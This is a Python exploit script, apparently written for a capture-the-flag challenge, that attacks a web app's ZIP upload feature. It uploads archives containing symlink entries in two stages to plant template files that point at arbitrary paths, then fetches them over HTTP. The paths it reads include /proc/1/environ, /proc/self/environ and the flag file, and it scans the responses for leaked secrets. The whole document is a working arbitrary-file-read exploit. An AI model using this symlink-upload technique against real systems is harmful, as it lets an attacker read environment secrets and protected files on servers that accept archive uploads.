#!/usr/bin/env python3
"""V41 adversarial verify: candidate "install-flag.sh residue (fd/tmp/shell-state)
before exec" — privilege/process angle.

Hypothesis: install-flag.sh leaves the flag (or its random path) somewhere the
server (uid 1001, PID7) can READ over HTTP via the a1 symlink read primitive.

We use the CONFIRMED a1 arbitrary-read (symlink /app/views/<name>.ejs -> abs path,
then GET /<name>) to attempt reading every plausible residue location:
 - PID1 (docker-init) environ/fd/cmdline (still holds FLAG=grey{...} in env)
 - /proc/self/* of the node server (FLAG was unset before exec)
 - tmp/run/var-run residue files
 - the flag file itself via /proc/1/root indirection
SUCCESS = HTTP response contains FLAG_VAL or SECRET (as appuser, not docker-root).
Unique namespace v41; stage1 dir-symlink vv41 -> ../views.
"""
import io
import sys
import zipfile
import requests

BASE = (sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:34267")
UA = {"User-Agent": "v41probe"}
TAG = "v41"
STAGE1 = "vv41"

FLAG_NAME = "a8e6a1fd8267f11edbcf"
FLAG_VAL = "grey{local_test_d3adb33fc0ffee}"
SECRET = "d3adb33fc0ffee"
FLAG_PATH = f"/flag-{FLAG_NAME}.txt"


def zi_symlink(name):
    z = zipfile.ZipInfo(name)
    z.create_system = 3
    z.external_attr = (0o120777 & 0xFFFF) << 16
    return z


def build(entries):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        for name, data in entries:
            z.writestr(zi_symlink(name), data)
    return buf.getvalue()


def upload(blob, fname):
    r = requests.post(f"{BASE}/upload",
                      files={"photos": (fname, blob, "application/zip")},
                      allow_redirects=False, timeout=30, headers=UA)
    return r.status_code, r.headers.get("location", "")


def get(path):
    return requests.get(f"{BASE}{path}", timeout=30, headers=UA, allow_redirects=False)


# residue-focused targets (install-flag.sh privilege/process angle)
TARGETS = {
    f"r_p1env_{TAG}": "/proc/1/environ",          # docker-init env holds FLAG (EACCES expect)
    f"r_p1cmd_{TAG}": "/proc/1/cmdline",          # cmdline (no random path expect)
    f"r_p1fd0_{TAG}": "/proc/1/fd/0",
    f"r_p1fd1_{TAG}": "/proc/1/fd/1",
    f"r_p1fd255_{TAG}": "/proc/1/fd/255",         # bash sometimes keeps script on 255
    f"r_p1root_{TAG}": "/proc/1/root" + FLAG_PATH,  # flag via init's root (a2 grey expect)
    f"r_selfenv_{TAG}": "/proc/self/environ",     # node env: FLAG unset
    f"r_selfcmd_{TAG}": "/proc/self/cmdline",
    f"r_selffd_{TAG}": "/proc/self/fd/0",
    f"r_tmp_{TAG}": "/tmp",                        # EISDIR expect, residue check
    f"r_run_{TAG}": "/run",
    f"r_varrun_{TAG}": "/var/run/flag",
    f"r_flagdirect_{TAG}": FLAG_PATH,             # ground truth: a2 grey -> 500
}


def scan(txt):
    return {
        "name": FLAG_NAME in txt,
        "val": FLAG_VAL in txt,
        "sec": SECRET in txt,
        "grey": "grey" in txt,
    }


def main():
    print("== stage1 ==", upload(build([(STAGE1, "../views")]), f"s1_{TAG}.zip"))
    entries = [(f"{STAGE1}/{n}.ejs", t) for n, t in TARGETS.items()]
    print("== stage2 ==", upload(build(entries), f"s2_{TAG}.zip"))

    print("\n== READ PROBES (a1 via HTTP, appuser priv) ==")
    win = None
    for n, t in TARGETS.items():
        try:
            r = get(f"/{n}")
        except Exception as e:
            print(f"\n/{n} -> {t} EXC {e}")
            continue
        txt = r.content.decode("utf-8", "replace")
        s = scan(txt)
        print(f"\n/{n} -> {t} [{r.status_code}] len={len(r.content)} {s}")
        print("  ", repr(txt[:160]))
        if (s["sec"] or s["val"]):
            win = ("LEAK", n, t, "no-grey" if not s["grey"] else "with-grey", r.status_code)
    print("\n== RESULT ==", win if win else "NO FLAG LEAK (candidate WALLED)")


if __name__ == "__main__":
    main()
